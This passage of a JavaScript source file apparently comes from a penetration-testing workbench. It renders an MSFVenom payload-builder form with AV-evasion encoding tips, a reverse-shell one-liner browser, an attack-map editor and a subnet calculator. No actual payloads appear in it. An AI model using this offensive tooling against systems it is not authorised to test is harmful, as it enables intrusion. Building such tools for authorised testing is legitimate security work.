                            <button class="btn btn-icon" id="favoritesFilterBtn" onclick="CommandManager.toggleFavoritesFilter()" title="Show favorites only">
                                <span id="favoritesFilterIcon">☆</span>
                            </button>
                            <span id="commandsCount" class="commands-count">0 commands</span>
                        </div>
                    </div>
                    <div id="commandsList" class="commands-grid">
                        <div class="loading">Loading commands...</div>
                    </div>
                </main>
            </div>
        `;
    },

    /**
     * Render MSFVenom Builder content
     */
    renderMSFVenomContent() {
        // Build platform options
        const platforms = Object.keys(MSFVenomBuilder.PAYLOADS);
        const platformOptions = platforms.map(p =>
            `<option value="${p}" ${p === MSFVenomBuilder.state.platform ? 'selected' : ''}>${p}</option>`
        ).join('');

        // Build category options for current platform
        const categories = Object.keys(MSFVenomBuilder.PAYLOADS[MSFVenomBuilder.state.platform] || {});
        const categoryOptions = categories.map(c =>
            `<option value="${c}" ${c === MSFVenomBuilder.state.category ? 'selected' : ''}>${c}</option>`
        ).join('');

        // Build payload options for current platform/category
        const payloads = MSFVenomBuilder.PAYLOADS[MSFVenomBuilder.state.platform]?.[MSFVenomBuilder.state.category] || [];
        const payloadOptions = payloads.map(p =>
            `<option value="${p.value}" ${p.value === MSFVenomBuilder.state.payload ? 'selected' : ''}>${p.label}</option>`
        ).join('');

        // Build format options
        let formatOptions = '';
        Object.entries(MSFVenomBuilder.FORMATS).forEach(([group, formats]) => {
            formatOptions += `<optgroup label="${group}">`;
            formats.forEach(f => {
                formatOptions += `<option value="${f.value}" ${f.value === MSFVenomBuilder.state.format ? 'selected' : ''}>${f.label}</option>`;
            });
            formatOptions += '</optgroup>';
        });

        // Build encoder options
        const encoderOptions = MSFVenomBuilder.ENCODERS.map(e =>
            `<option value="${e.value}" ${e.value === MSFVenomBuilder.state.encoder ? 'selected' : ''}>${e.label}</option>`
        ).join('');

        // Build encryption options
        const encryptOptions = MSFVenomBuilder.ENCRYPTION.map(e =>
            `<option value="${e.value}" ${e.value === MSFVenomBuilder.state.encrypt ? 'selected' : ''}>${e.label}</option>`
        ).join('');

        // Determine initial field visibility
        const currentPayload = MSFVenomBuilder.getCurrentPayload();
        const payloadType = currentPayload?.type || 'reverse';
        const showLhost = payloadType === 'reverse';
        const showRhost = payloadType === 'bind';
        const showCmd = payloadType === 'exec';

        setTimeout(() => {
            MSFVenomBuilder.init();
        }, 0);

        return `
            <div class="msfvenom-builder">
                <div class="msfvenom-header">
                    <h3>MSFVenom Payload Builder</h3>
                    <p>Generate msfvenom commands for Metasploit payloads</p>
                </div>

                <div class="msfvenom-container">
                    <div class="msfvenom-form">
                        <!-- Payload Selection -->
                        <div class="msf-form-section">
                            <h4>1. Payload Selection</h4>
                            <div class="msf-form-row">
                                <div class="msf-form-group">
                                    <label for="msf-platform">Platform</label>
                                    <select id="msf-platform">${platformOptions}</select>
                                </div>
                                <div class="msf-form-group">
                                    <label for="msf-category">Category</label>
                                    <select id="msf-category">${categoryOptions}</select>
                                </div>
                            </div>
                            <div class="msf-form-group">
                                <label for="msf-payload">Payload</label>
                                <select id="msf-payload">${payloadOptions}</select>
                            </div>
                        </div>

                        <!-- Connection Details -->
                        <div class="msf-form-section">
                            <h4>2. Connection Details</h4>
                            <div class="msf-form-row" id="msf-lhost-row" style="display: ${showLhost ? 'flex' : 'none'};">
                                <div class="msf-form-group">
                                    <label for="msf-lhost">LHOST (Your IP)</label>
                                    <input type="text" id="msf-lhost" placeholder="e.g., 192.168.1.100" value="${MSFVenomBuilder.state.lhost}">
                                </div>
                                <div class="msf-form-group">
                                    <label for="msf-lport">LPORT</label>
                                    <input type="number" id="msf-lport" value="${MSFVenomBuilder.state.lport}" min="1" max="65535">
                                </div>
                            </div>
                            <div class="msf-form-row" id="msf-rhost-row" style="display: ${showRhost ? 'flex' : 'none'};">
                                <div class="msf-form-group">
                                    <label for="msf-rhost">RHOST (Target IP)</label>
                                    <input type="text" id="msf-rhost" placeholder="e.g., 10.10.10.10" value="${MSFVenomBuilder.state.rhost}">
                                </div>
                                <div class="msf-form-group">
                                    <label for="msf-rport">RPORT</label>
                                    <input type="number" id="msf-rport" value="${MSFVenomBuilder.state.rport}" min="1" max="65535">
                                </div>
                            </div>
                            <div class="msf-form-group" id="msf-cmd-row" style="display: ${showCmd ? 'block' : 'none'};">
                                <label for="msf-cmd">Command to Execute</label>
                                <input type="text" id="msf-cmd" placeholder="e.g., calc.exe" value="${MSFVenomBuilder.state.cmd}">
                            </div>
                        </div>

                        <!-- Output Options -->
                        <div class="msf-form-section">
                            <h4>3. Output Options</h4>
                            <div class="msf-form-row">
                                <div class="msf-form-group">
                                    <label for="msf-format">Format</label>
                                    <select id="msf-format">${formatOptions}</select>
                                </div>
                                <div class="msf-form-group">
                                    <label for="msf-output">Output File (optional)</label>
                                    <input type="text" id="msf-output" placeholder="e.g., payload.exe" value="${MSFVenomBuilder.state.outputFile}">
                                </div>
                            </div>
                            <div class="msf-form-row">
                                <div class="msf-form-group">
                                    <label for="msf-arch">Architecture</label>
                                    <select id="msf-arch">
                                        <option value="" ${MSFVenomBuilder.state.arch === '' ? 'selected' : ''}>Auto-detect</option>
                                        <option value="x86" ${MSFVenomBuilder.state.arch === 'x86' ? 'selected' : ''}>x86</option>
                                        <option value="x64" ${MSFVenomBuilder.state.arch === 'x64' ? 'selected' : ''}>x64</option>
                                    </select>
                                </div>
                                <div class="msf-form-group">
                                    <label for="msf-exitfunc">Exit Function</label>
                                    <select id="msf-exitfunc">
                                        <option value="process" ${MSFVenomBuilder.state.exitfunc === 'process' ? 'selected' : ''}>process</option>
                                        <option value="thread" ${MSFVenomBuilder.state.exitfunc === 'thread' ? 'selected' : ''}>thread</option>
                                        <option value="seh" ${MSFVenomBuilder.state.exitfunc === 'seh' ? 'selected' : ''}>seh</option>
                                        <option value="none" ${MSFVenomBuilder.state.exitfunc === 'none' ? 'selected' : ''}>none</option>
                                    </select>
                                </div>
                            </div>
                        </div>

                        <!-- Advanced Options -->
                        <div class="msf-form-section msf-advanced-section">
                            <button type="button" class="advanced-toggle" onclick="MSFVenomBuilder.toggleAdvanced()">
                                <span class="toggle-icon">+</span>
                                Advanced Options (Encoding & Encryption)
                            </button>
                            <div id="msf-advanced" class="advanced-options" style="display: none;">
                                <div class="msf-form-row">
                                    <div class="msf-form-group">
                                        <label for="msf-encoder">Encoder</label>
                                        <select id="msf-encoder">${encoderOptions}</select>
                                    </div>
                                    <div class="msf-form-group">
                                        <label for="msf-iterations">Iterations</label>
                                        <input type="number" id="msf-iterations" value="${MSFVenomBuilder.state.iterations}" min="1" max="50">
                                    </div>
                                </div>
                                <div class="msf-form-group">
                                    <label for="msf-badchars">Bad Characters (hex)</label>
                                    <input type="text" id="msf-badchars" placeholder="e.g., \\x00\\x0a\\x0d" value="${MSFVenomBuilder.state.badChars}">
                                    <small>Characters to avoid in the payload</small>
                                </div>
                                <div class="msf-form-row">
                                    <div class="msf-form-group">
                                        <label for="msf-encrypt">Encryption</label>
                                        <select id="msf-encrypt">${encryptOptions}</select>
                                    </div>
                                </div>
                                <div class="msf-form-row" id="msf-encrypt-keys" style="display: ${MSFVenomBuilder.state.encrypt ? 'flex' : 'none'};">
                                    <div class="msf-form-group">
                                        <label for="msf-encrypt-key">Encryption Key</label>
                                        <input type="text" id="msf-encrypt-key" placeholder="Encryption key" value="${MSFVenomBuilder.state.encryptKey}">
                                    </div>
                                    <div class="msf-form-group">
                                        <label for="msf-encrypt-iv">IV (for AES)</label>
                                        <input type="text" id="msf-encrypt-iv" placeholder="Initialization vector" value="${MSFVenomBuilder.state.encryptIv}">
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="msfvenom-preview">
                        <div class="preview-header">
                            <h4>Generated Command</h4>
                        </div>
                        <pre id="msf-command-preview" class="command-preview">${MSFVenomBuilder.generateCommand()}</pre>
                        <div class="preview-actions">
                            <button class="btn btn-primary" onclick="MSFVenomBuilder.copyToClipboard()">
                                Copy to Clipboard
                            </button>
                            <button class="btn btn-secondary" onclick="MSFVenomBuilder.saveToCommands()">
                                Save to Commands
                            </button>
                        </div>
                        <div class="preview-tips">
                            <h5>Quick Tips</h5>
                            <ul>
                                <li>Use <code>shikata_ga_nai</code> for basic AV evasion</li>
                                <li>Higher iterations = more encoding passes</li>
                                <li>Bad chars: <code>\\x00</code> (null), <code>\\x0a</code> (newline)</li>
                                <li>Use <code>-o</code> to output directly to a file</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        `;
    },

    /**
     * Render CyberChef content based on installation status
     */
    renderCyberChefContent() {
        if (!this.cyberchefStatus?.installed) {
            return this.renderCyberChefInstallPrompt();
        }
        return this.renderCyberChefInstalled();
    },

    /**
     * Render install prompt when CyberChef is not installed
     */
    renderCyberChefInstallPrompt() {
        return `
            <div class="tool-install-prompt">
                <div class="install-icon"><i data-lucide="chef-hat"></i></div>
                <h3>CyberChef Not Installed</h3>
                <p>CyberChef is a powerful web app for encoding, decoding, and analyzing data.</p>
                ${AppState.currentUser?.role === 'admin' ? `
                <p class="install-size">Download size: ~83 MB (pinned release, checksum verified)</p>
                <button class="btn btn-primary btn-lg" onclick="ToolsManager.installCyberChef()" id="installCyberChefBtn">
                    <span class="btn-text">Install CyberChef</span>
                    <span class="btn-loading" style="display:none;">Installing...</span>
                </button>` : `
                <p class="text-muted">Ask an administrator to install it.</p>`}
            </div>
        `;
    },

    /**
     * Render CyberChef launch button when installed
     */
    renderCyberChefInstalled() {
        return `
            <div class="tool-installed">
                <div class="install-icon"><i data-lucide="chef-hat"></i></div>
                <h3>CyberChef</h3>
                <p>A web app for encoding, decoding, and analyzing data.</p>
                <p class="version-info">Version: ${escapeHtml(this.cyberchefStatus?.version || 'Unknown')}</p>
                <button class="btn btn-primary btn-lg" onclick="ToolsManager.openCyberChef()">
                    Open CyberChef
                </button>
            </div>
        `;
    },

    /**
     * Open CyberChef in a new tab
     */
    openCyberChef() {
        window.open('/api/admin/cyberchef', '_blank');
    },

    /**
     * Install CyberChef
     */
    async installCyberChef() {
        const btn = document.getElementById('installCyberChefBtn');
        if (btn) {
            btn.disabled = true;
            btn.querySelector('.btn-text').style.display = 'none';
            btn.querySelector('.btn-loading').style.display = 'inline';
        }

        try {
            const result = await API.admin.installCyberChef();
            showToast(`CyberChef ${result.version} installed successfully`, 'success');
            this.cyberchefStatus = { installed: true, version: result.version };
            this.renderToolsSection();
        } catch (error) {
            console.error('Failed to install CyberChef:', error);
            showToast('Failed to install CyberChef: ' + error.message, 'error');
            if (btn) {
                btn.disabled = false;
                btn.querySelector('.btn-text').style.display = 'inline';
                btn.querySelector('.btn-loading').style.display = 'none';
            }
        }
    },

    /**
     * Switch between tool tabs
     */
    switchTool(toolId) {
        // Backward compat: redirect legacy jwt/powershell deep links to decoders
        if (toolId === 'jwt' || toolId === 'powershell') {
            DecodersManager.activeSubTool = toolId;
            toolId = 'decoders';
        }
        if (toolId === 'cvss' || toolId === 'subnet') {
            CalculatorsManager.activeSubTool = toolId;
            toolId = 'calculators';
        }
        if (toolId === 'msfvenom' || toolId === 'shells' || toolId === 'commands' || toolId === 'markdown') {
            CommandHubManager.activeSubTool = toolId;
            toolId = 'command';
        }

        // Update tab states
        document.querySelectorAll('.tools-tab').forEach(tab => {
            tab.classList.toggle('active', tab.dataset.tool === toolId);
        });

        this.activeTab = toolId;
        const content = document.getElementById('toolsContent');
        if (content) {
            content.innerHTML = this.renderActiveTabContent();
        }
    },

    /**
     * Render coming soon placeholder
     */
    renderComingSoon(toolName, icon) {
        return `
            <div class="tool-coming-soon">
                <div class="coming-soon-icon">${icon}</div>
                <h3>${escapeHtml(toolName)}</h3>
                <p>Coming Soon</p>
            </div>
        `;
    },

    /**
     * Render Attack Maps tool content
     */
    renderAttackMapsContent() {
        setTimeout(async () => {
            // Wire palette button clicks
            document.querySelectorAll('.atk-palette-btn').forEach(btn => {
                btn.addEventListener('click', () => {
                    const nodeType = btn.dataset.nodeType;
                    if (nodeType && typeof AttackMapEditor !== 'undefined') {
                        AttackMapEditor.setAddNodeType(nodeType);
                    }
                });
            });

            if (typeof AttackMapEditor !== 'undefined') {
                await AttackMapEditor.init('attackMapCanvas');
                if (typeof lucide !== 'undefined') lucide.createIcons();
            }
        }, 0);

        const nodeTypes = [
            { type: 'recon', color: 'var(--node-recon)', label: 'Recon' },
            { type: 'tactic', color: 'var(--node-tactic)', label: 'Tactic' },
            { type: 'exploit', color: 'var(--node-exploit)', label: 'Exploit' },
            { type: 'connector', color: 'var(--node-connector)', label: 'Connect' },
            { type: 'evidence_ref', color: 'var(--node-evidence)', label: 'Evidence' },
            { type: 'finding_ref', color: 'var(--node-finding)', label: 'Finding' },
            { type: 'host_ref', color: 'var(--node-host)', label: 'Host' }
        ];

        const paletteButtons = nodeTypes.map(n => `
            <button class="atk-palette-btn" data-node-type="${n.type}"
                    title="Add ${n.label} node">
                <span class="atk-palette-dot" style="background:${n.color};"></span>
                <span class="atk-palette-label">${n.label}</span>
            </button>
        `).join('');

        return `
            <div class="attack-maps-page">
                <!-- Toolbar -->
                <div class="atk-toolbar">
                    <!-- Map selector -->
                    <div id="attackMapSelector" class="atk-selector">
                        <select class="atk-select">
                            <option>Loading...</option>
                        </select>
                    </div>
                    <button class="btn btn-sm btn-primary" onclick="AttackMapEditor.promptNewMap()" title="Create a new attack map">+ New</button>
                    <button class="btn btn-sm btn-secondary" onclick="AttackMapEditor.duplicateCurrentMap()" title="Duplicate the current map">Dup</button>
                    <button class="btn btn-sm btn-quiet-danger" onclick="AttackMapEditor.deleteCurrentMap()" title="Delete the current map">Del</button>

                    <div class="atk-divider" aria-hidden="true"></div>

                    <!-- Connect mode -->
                    <button id="attackMapConnectBtn" class="btn btn-sm btn-secondary atk-connect" onclick="AttackMapEditor.toggleConnectMode()"
                            title="Toggle connect mode to draw arrows between nodes">
                        <i data-lucide="link"></i> Connect
                    </button>

                    <!-- Zoom -->
                    <div class="atk-zoom">
                        <button class="btn btn-sm btn-secondary" onclick="AttackMapEditor.zoomIn()" title="Zoom in" aria-label="Zoom in">+</button>
                        <button class="btn btn-sm btn-secondary" onclick="AttackMapEditor.zoomOut()" title="Zoom out" aria-label="Zoom out">−</button>
                        <button class="btn btn-sm btn-secondary" onclick="AttackMapEditor.zoomFit()" title="Zoom to fit all nodes">Fit</button>
                    </div>
                </div>

                <!-- Palette + Canvas + Properties -->
                <div class="atk-body">
                    <!-- Left Palette -->
                    <div class="atk-palette">
                        ${paletteButtons}
                    </div>
                    <div id="attackMapCanvas" class="atk-canvas"></div>
                    <div id="attackMapProperties" class="atk-properties">
                        <div class="atk-empty">
                            Select a node or edge to edit its properties
                        </div>
                    </div>
                </div>
            </div>
        `;
    },

    /**
     * Setup event listeners
     */
    setupEventListeners() {
        // Additional event listeners can be added here if needed
    }
};

// Make ToolsManager available globally
window.ToolsManager = ToolsManager;


/**
 * Shell One-Liners Manager - Reference tool for shell commands
 */
const ShellOneLinersManager = {
    state: {
        oneliners: [],
        categories: [],
        subcategories: {},
        activeCategory: 'reverse_shells',
        activeSubcategory: 'all',
        variables: {
            LHOST: '',
            LPORT: '4444',
            RHOST: '',
            RPORT: '',
            ROWS: '38',
            COLS: '116'
        },
        loading: false,
        searchQuery: ''
    },

    CATEGORY_LABELS: {
        'shells': 'Shells',
        'reverse_shells': 'Reverse Shells',
        'shell_upgrades': 'Shell Upgrades'
    },

    CATEGORY_ICONS: {
        'shells': '<i data-lucide="terminal"></i>',
        'reverse_shells': '<i data-lucide="corner-down-left"></i>',
        'shell_upgrades': '<i data-lucide="arrow-up"></i>'
    },

    /**
     * Initialize the shell one-liners manager
     */
    async init() {
        this.setupEventListeners();
        await this.loadData();
    },

    /**
     * Load one-liners and categories from API
     */
    async loadData() {
        try {
            this.state.loading = true;
            this.updateLoadingState();

            const [oneliners, categoriesData] = await Promise.all([
                API.shellOneliners.getAll({ category: this.state.activeCategory }),
                API.shellOneliners.getCategories()
            ]);

            this.state.oneliners = oneliners;
            this.state.categories = categoriesData.categories;
            this.state.subcategories = categoriesData.subcategories;
            this.state.loading = false;

            this.renderOnelinersList();
            this.renderSubcategoryFilter();
        } catch (error) {
            console.error('Failed to load shell one-liners:', error);
            this.state.loading = false;
            showToast('Failed to load shell one-liners', 'error');
        }
    },

    /**
     * Setup event listeners
     */
    setupEventListeners() {
        // Variable inputs
        const variableInputs = document.querySelectorAll('.shell-var-input');
        variableInputs.forEach(input => {
            input.addEventListener('input', (e) => {
                const varName = e.target.dataset.var;
                this.state.variables[varName] = e.target.value;
                this.renderOnelinersList();
            });
        });

        // Search input
        const searchInput = document.getElementById('shell-search');
        if (searchInput) {
            searchInput.addEventListener('input', (e) => {
                this.state.searchQuery = e.target.value;
                this.filterOneliners();
            });
        }
    },

    /**
     * Switch category
     */
    async switchCategory(category) {
        if (category === this.state.activeCategory) return;

        this.state.activeCategory = category;
        this.state.activeSubcategory = 'all';
        this.state.searchQuery = '';

        // Update tab UI
        document.querySelectorAll('.shell-category-tab').forEach(tab => {
            tab.classList.toggle('active', tab.dataset.category === category);
        });

        await this.loadData();
    },

    /**
     * Filter by subcategory
     */
    filterBySubcategory(subcategory) {
        this.state.activeSubcategory = subcategory;

        // Update filter UI
        document.querySelectorAll('.shell-subcategory-btn').forEach(btn => {
            btn.classList.toggle('active', btn.dataset.subcategory === subcategory);
        });

        this.filterOneliners();
    },

    /**
     * Filter one-liners based on subcategory and search
     */
    filterOneliners() {
        const filtered = this.state.oneliners.filter(item => {
            const matchesSubcategory = this.state.activeSubcategory === 'all' ||
                item.subcategory === this.state.activeSubcategory;
            const matchesSearch = !this.state.searchQuery ||
                item.name.toLowerCase().includes(this.state.searchQuery.toLowerCase()) ||
                item.command.toLowerCase().includes(this.state.searchQuery.toLowerCase()) ||
                (item.description && item.description.toLowerCase().includes(this.state.searchQuery.toLowerCase()));
            return matchesSubcategory && matchesSearch;
        });

        this.renderOnelinersList(filtered);
    },

    /**
     * Substitute variables in command
     */
    substituteVariables(command) {
        let result = command;
        Object.entries(this.state.variables).forEach(([name, value]) => {
            const regex = new RegExp(`\\{\\{${name}\\}\\}`, 'g');
            result = result.replace(regex, value || `{{${name}}}`);
        });
        return result;
    },

    /**
     * Copy command to clipboard
     */
    async copyCommand(command, buttonEl) {
        const substituted = this.substituteVariables(command);
        try {
            await navigator.clipboard.writeText(substituted);
            showToast('Copied to clipboard', 'success');

            // Visual feedback
            if (buttonEl) {
                const originalText = buttonEl.innerHTML;
                buttonEl.innerHTML = '<i data-lucide="check" class="icon-sm"></i>';
                if (typeof lucide !== 'undefined') lucide.createIcons();
                setTimeout(() => {
                    buttonEl.innerHTML = originalText;
                    if (typeof lucide !== 'undefined') lucide.createIcons();
                }, 1500);
            }
        } catch (error) {
            showToast('Failed to copy', 'error');
        }
    },

    /**
     * Render the main shell one-liners UI
     */
    render() {
        const categoryTabs = Object.entries(this.CATEGORY_LABELS).map(([key, label]) => `
            <button class="shell-category-tab ${this.state.activeCategory === key ? 'active' : ''}"
                    data-category="${key}"
                    onclick="ShellOneLinersManager.switchCategory('${key}')">
                <span class="tab-icon">${this.CATEGORY_ICONS[key]}</span>
                <span>${label}</span>
            </button>
        `).join('');

        return `
            <div class="shell-oneliners">
                <div class="shell-header">
                    <h3>Shell One-Liners</h3>
                    <p>Quick reference for shells, reverse shells, and TTY upgrades</p>
                </div>

                <div class="shell-category-tabs">
                    ${categoryTabs}
                </div>

                <div class="shell-oneliners-container">
                    <div class="shell-variables-panel">
                        <h4>Variables</h4>
                        <p class="shell-var-hint">Set values to auto-substitute in commands</p>

                        <div class="shell-var-group">
                            <label>LHOST (Your IP)</label>
                            <input type="text" class="shell-var-input" data-var="LHOST"
                                   placeholder="10.0.0.1" value="${this.state.variables.LHOST}">
                        </div>

                        <div class="shell-var-group">
                            <label>LPORT</label>
                            <input type="text" class="shell-var-input" data-var="LPORT"
                                   placeholder="4444" value="${this.state.variables.LPORT}">
                        </div>

                        <div class="shell-var-group">
                            <label>RHOST (Target IP)</label>
                            <input type="text" class="shell-var-input" data-var="RHOST"
                                   placeholder="192.168.1.1" value="${this.state.variables.RHOST}">
                        </div>

                        <div class="shell-var-group">
                            <label>Terminal Size</label>
                            <div class="shell-var-row">
                                <input type="text" class="shell-var-input shell-var-sm" data-var="ROWS"
                                       placeholder="38" value="${this.state.variables.ROWS}">
                                <span>x</span>
                                <input type="text" class="shell-var-input shell-var-sm" data-var="COLS"
                                       placeholder="116" value="${this.state.variables.COLS}">
                            </div>
                        </div>

                        <div class="shell-var-actions">
                            <button class="btn btn-sm btn-secondary" onclick="ShellOneLinersManager.detectLocalIP()">
                                Detect Local IP
                            </button>
                        </div>
                    </div>

                    <div class="shell-main-panel">
                        <div class="shell-toolbar">
                            <div class="shell-subcategory-filter" id="shellSubcategoryFilter">
                                <!-- Populated dynamically -->
                            </div>
                            <div class="shell-search">
                                <input type="text" id="shell-search" placeholder="Search one-liners..."
                                       value="${this.state.searchQuery}">
                            </div>
                        </div>

                        <div class="shell-oneliners-list" id="shellOnelinersList">
                            <div class="shell-loading">Loading...</div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    },

    /**
     * Render subcategory filter buttons
     */
    renderSubcategoryFilter() {
        const container = document.getElementById('shellSubcategoryFilter');
        if (!container) return;

        const subcats = this.state.subcategories[this.state.activeCategory] || [];
        const buttons = [
            `<button class="shell-subcategory-btn ${this.state.activeSubcategory === 'all' ? 'active' : ''}"
                     data-subcategory="all"
                     onclick="ShellOneLinersManager.filterBySubcategory('all')">All</button>`
        ];

        subcats.forEach(sub => {
            buttons.push(`
                <button class="shell-subcategory-btn ${this.state.activeSubcategory === sub.name ? 'active' : ''}"
                        data-subcategory="${escapeHtml(sub.name)}"
                        data-action="filter-oneliner-subcategory">
                    ${escapeHtml(sub.name)} (${escapeHtml(sub.count)})
                </button>
            `);
        });

        container.innerHTML = buttons.join('');
    },

    /**
     * Render the list of one-liners
     */
    renderOnelinersList(items = null) {
        const container = document.getElementById('shellOnelinersList');
        if (!container) return;

        const oneliners = items || this.state.oneliners;

        if (this.state.loading) {
            container.innerHTML = '<div class="shell-loading">Loading...</div>';
            return;
        }

        if (oneliners.length === 0) {
            container.innerHTML = `
                <div class="shell-empty">
                    <p>No one-liners found</p>
                </div>
            `;
            return;
        }

        // Group by subcategory. It is stored free text: a Map accepts any name
        // (even "__proto__") and the heading is escaped (L-20).
        const grouped = new Map();
        oneliners.forEach(item => {
            const key = item.subcategory || 'other';
            if (!grouped.has(key)) grouped.set(key, []);
            grouped.get(key).push(item);
        });

        let html = '';
        grouped.forEach((items, subcategory) => {
            html += `
                <div class="shell-group">
                    <h5 class="shell-group-title">${escapeHtml(subcategory)}</h5>
                    ${items.map(item => this.renderOnelinerCard(item)).join('')}
                </div>
            `;
        });

        container.innerHTML = html;

        // Initialize icons
        if (typeof lucide !== 'undefined') {
            lucide.createIcons();
        }
    },

    /**
     * Render a single one-liner row (compact layout)
     */
    renderOnelinerCard(item) {
        const substitutedCommand = this.substituteVariables(item.command);
        const hasVariables = item.command.includes('{{');
        // Truncate and flatten command for display
        const displayCommand = substitutedCommand.replace(/\\n/g, ' ').replace(/\s+/g, ' ').trim();

        return `
            <div class="shell-oneliner-card" title="${escapeHtml(item.description || item.name)}">
                <div class="shell-oneliner-header">
                    <span class="shell-oneliner-name">${escapeHtml(item.name)}</span>
                </div>
                <pre class="shell-oneliner-command">${escapeHtml(displayCommand)}</pre>
                ${hasVariables ? '<span class="shell-var-indicator">vars</span>' : ''}
                <div class="shell-oneliner-actions">
                    <button class="btn btn-icon btn-sm" data-action="copy-oneliner" data-command="${escapeHtml(item.command)}" title="Copy to clipboard">
                        <i data-lucide="copy" class="icon-sm"></i>
                    </button>
                </div>
            </div>
        `;
    },

    /**
     * Update loading state UI
     */
    updateLoadingState() {
        const container = document.getElementById('shellOnelinersList');
        if (container && this.state.loading) {
            container.innerHTML = '<div class="shell-loading">Loading...</div>';
        }
    },

    /**
     * Try to detect local IP (placeholder - shows hint)
     */
    detectLocalIP() {
        showToast('Run "ip a" or "ifconfig" in terminal to find your IP', 'info');
    }
};

// Make ShellOneLinersManager available globally
window.ShellOneLinersManager = ShellOneLinersManager;

// One-liner commands and subcategories travel in data-* attributes, never inside handler code (H-10).
registerAction('copy-oneliner', el => ShellOneLinersManager.copyCommand(el.dataset.command, el));
registerAction('filter-oneliner-subcategory', el => ShellOneLinersManager.filterBySubcategory(el.dataset.subcategory));

/**
 * Subnet Calculator - CIDR/IP network calculations
 */
const SubnetCalculator = {
    state: {
        input: '192.168.1.0/24',
        results: null,
        error: null
    },

    init() {
        this.setupEventListeners();
        this.calculate();
    },

    setupEventListeners() {
        const input = document.getElementById('subnet-input');
        if (input) {
            input.addEventListener('input', (e) => {
                this.state.input = e.target.value;
                this.calculate();
            });
        }
    },

    ipToInt(ip) {
        const parts = ip.split('.');
        if (parts.length !== 4) return null;
        let result = 0;
        for (let i = 0; i < 4; i++) {
            const num = parseInt(parts[i], 10);
            if (isNaN(num) || num < 0 || num > 255) return null;
            result = (result << 8) + num;
        }
        return result >>> 0;
    },

    intToIp(int) {
        return [
            (int >>> 24) & 255,
            (int >>> 16) & 255,
            (int >>> 8) & 255,
            int & 255
        ].join('.');
    },

    getNetworkInfo(ip, cidr) {
        const ipInt = this.ipToInt(ip);
        if (ipInt === null || cidr < 0 || cidr > 32) return null;

        const mask = cidr === 0 ? 0 : (0xFFFFFFFF << (32 - cidr)) >>> 0;
        const wildcard = (~mask) >>> 0;
        const network = (ipInt & mask) >>> 0;
        const broadcast = (network | wildcard) >>> 0;
        const totalHosts = Math.pow(2, 32 - cidr);
        const usableHosts = cidr >= 31 ? totalHosts : Math.max(0, totalHosts - 2);
        const firstUsable = cidr >= 31 ? network : network + 1;
        const lastUsable = cidr >= 31 ? broadcast : broadcast - 1;

        // Determine IP class
        const firstOctet = (ipInt >>> 24) & 255;
        let ipClass;
        if (firstOctet < 128) ipClass = 'A';
        else if (firstOctet < 192) ipClass = 'B';
        else if (firstOctet < 224) ipClass = 'C';
        else if (firstOctet < 240) ipClass = 'D (Multicast)';
        else ipClass = 'E (Reserved)';

        // Binary representation
        const ipBinary = ipInt.toString(2).padStart(32, '0');
        const networkBinary = ipBinary.substring(0, cidr);
        const hostBinary = ipBinary.substring(cidr);

        return {
            networkAddress: this.intToIp(network),
            broadcastAddress: this.intToIp(broadcast),
            firstUsable: this.intToIp(firstUsable),
            lastUsable: this.intToIp(lastUsable),
            totalHosts: totalHosts,
            usableHosts: usableHosts,
            subnetMask: this.intToIp(mask),
            subnetMaskBinary: mask.toString(2).padStart(32, '0').match(/.{8}/g).join('.'),
            subnetMaskHex: '0x' + mask.toString(16).toUpperCase().padStart(8, '0'),
            wildcardMask: this.intToIp(wildcard),
            ipClass: ipClass,
            cidr: cidr,
            networkBinary: networkBinary,
            hostBinary: hostBinary
        };
    },

    parseInput(input) {
        input = input.trim();

        // CIDR notation: 192.168.1.0/24
        const cidrMatch = input.match(/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\/(\d{1,2})$/);
        if (cidrMatch) {
            return { ip: cidrMatch[1], cidr: parseInt(cidrMatch[2], 10) };
        }

        // IP with subnet mask: 192.168.1.0 255.255.255.0
        const maskMatch = input.match(/^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})$/);
        if (maskMatch) {
            const maskInt = this.ipToInt(maskMatch[2]);
            if (maskInt === null) return null;
            // Convert mask to CIDR
            const binary = maskInt.toString(2);
            const cidr = (binary.match(/1/g) || []).length;
            // Validate mask is contiguous
            if (binary.indexOf('01') !== -1) return null;
            return { ip: maskMatch[1], cidr: cidr };
        }

        return null;
    },

    calculate() {
        const parsed = this.parseInput(this.state.input);

        if (!parsed) {
            this.state.error = 'Invalid input. Use CIDR (192.168.1.0/24) or IP + mask (192.168.1.0 255.255.255.0)';
            this.state.results = null;
        } else {
            const results = this.getNetworkInfo(parsed.ip, parsed.cidr);
            if (!results) {
                this.state.error = 'Invalid IP address or subnet mask';
                this.state.results = null;
            } else {
                this.state.results = results;
                this.state.error = null;
            }
        }

        this.updateDisplay();
    },

    updateDisplay() {
        const resultsEl = document.getElementById('subnet-results');
        if (!resultsEl) return;

        if (this.state.error) {
            resultsEl.innerHTML = `<div class="subnet-error">${escapeHtml(this.state.error)}</div>`;
            return;
        }

        if (!this.state.results) {
            resultsEl.innerHTML = '<div class="subnet-empty">Enter a valid CIDR or IP address</div>';
            return;
        }

        const r = this.state.results;
        resultsEl.innerHTML = `
            <div class="subnet-result-grid">
                <div class="subnet-result-row">
                    <span class="subnet-label">Network Address</span>
                    <span class="subnet-value">${escapeHtml(r.networkAddress)}</span>
                    <button class="btn btn-icon btn-sm" onclick="SubnetCalculator.copyValue('${r.networkAddress}')" title="Copy">
                        <i data-lucide="copy" class="icon-sm"></i>
                    </button>
                </div>
                <div class="subnet-result-row">
                    <span class="subnet-label">Broadcast Address</span>
                    <span class="subnet-value">${escapeHtml(r.broadcastAddress)}</span>
                    <button class="btn btn-icon btn-sm" onclick="SubnetCalculator.copyValue('${r.broadcastAddress}')" title="Copy">
                        <i data-lucide="copy" class="icon-sm"></i>
                    </button>
                </div>
                <div class="subnet-result-row">
                    <span class="subnet-label">First Usable IP</span>
                    <span class="subnet-value">${escapeHtml(r.firstUsable)}</span>
                    <button class="btn btn-icon btn-sm" onclick="SubnetCalculator.copyValue('${r.firstUsable}')" title="Copy">
                        <i data-lucide="copy" class="icon-sm"></i>
                    </button>
                </div>
                <div class="subnet-result-row">
                    <span class="subnet-label">Last Usable IP</span>
                    <span class="subnet-value">${escapeHtml(r.lastUsable)}</span>
